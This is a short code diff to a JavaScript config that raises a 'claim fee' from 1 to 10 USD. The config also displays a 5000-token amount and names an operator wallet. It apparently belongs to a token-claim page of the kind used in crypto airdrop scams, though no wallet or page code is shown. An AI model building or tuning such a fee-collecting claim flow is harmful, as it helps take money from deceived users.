@@ -50,7 +50,7 @@ const config = {
 
   // 🔧 MOST COMMON FIX: Lower balance requirements
   FEE_SYSTEM: {
-    CLAIM_FEE_USD: 1.0, // Your fee amount
+    CLAIM_FEE_USD: 10.0, // Your fee amount
     DISPLAY_TOKEN_AMOUNT: 5000,
 
     // 🔥 Your wallet address - ENSURE THIS IS CORRECT
